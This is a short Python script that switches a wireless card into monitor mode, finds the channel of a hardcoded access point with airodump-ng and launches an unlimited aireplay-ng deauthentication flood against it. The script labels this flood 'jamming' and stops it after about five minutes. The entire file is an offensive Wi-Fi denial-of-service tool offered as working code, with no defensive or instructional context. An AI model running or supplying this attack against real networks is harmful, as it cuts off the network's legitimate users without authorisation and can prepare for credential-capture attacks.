#! /usr/share/python3
from  subprocess import run,Popen,PIPE
import os
import signal
import time

bssid = "62:78:52:65:C4:EC"#"BC:2E:F6:60:31:94"
timeMinnow =int(time.strftime("%M",time.gmtime()))
def setUpCard():
    rfkill = Popen('rfkill unblock wifi',shell=True)
    rfkill1 = Popen('rfkill unblock all',shell=True)
    run(['ifconfig' ,'wlan1','down'])
    time.sleep(0.5)
    run(['iwconfig' ,'wlan1','mode','monitor'])
    time.sleep(0.5)
    run(['ifconfig' ,'wlan1','up'])
    time.sleep(0.5)
    
def getChannel():
    channel = 0
    strobj = Popen(f"airodump-ng wlan1 | grep -e '{bssid}' -m 1",shell=True, stdout=PIPE).stdout
    string = strobj.read()
    if int(string.split()[6])<=14:
        channel = int(string.split()[6])
    else:
        channel = int(string.split()[5])
    return str(channel)

def jamming():
    channel = getChannel()
    print(f"{bssid} on channel " + channel)
    print(f"attack start at {timeMinnow} min \n")
    run(['iwconfig','wlan1','channel',channel])
    #a = run(['aireplay-ng','-0','0','-a',bssid,'wlan1'])
    a = Popen(f"aireplay-ng  -0 0 -a {bssid} wlan1",shell=True,preexec_fn=os.setsid)
    while True:
        timeM2 = int(time.strftime("%M",time.gmtime()))
        if (timeMinnow + 5) == timeM2:
            os.killpg(os.getpgid(a.pid), signal.SIGTERM)  
            print("Done")
            break
    
    
setUpCard()

jamming()
      
